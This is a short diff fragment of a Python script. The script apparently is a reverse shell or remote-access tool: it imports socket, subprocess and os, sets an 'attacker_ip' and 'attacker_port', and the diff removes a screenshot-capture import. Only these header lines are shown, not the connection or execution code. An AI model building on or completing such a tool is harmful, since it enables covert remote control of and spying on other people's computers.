@@ -1,7 +1,6 @@
 import socket
 import subprocess
 import os
-import pyscreenshot as ImageGrab
 
 attacker_ip = '192.168.0.119'
 attacker_port = 6996
